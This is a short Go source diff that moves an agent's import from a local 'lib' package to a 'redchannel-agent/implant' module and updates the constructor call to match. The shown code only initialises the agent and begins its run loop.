@@ -3,11 +3,11 @@ package main
 import (
 	"time"
 
-	"./lib"
+	"github.com/slackr/redchannel-agent/implant"
 )
 
 func main() {
-	agent := lib.Agent{}
+	agent := implant.Agent{}
 
 	agent.Init()
 	for agent.IsShutdown() != true {
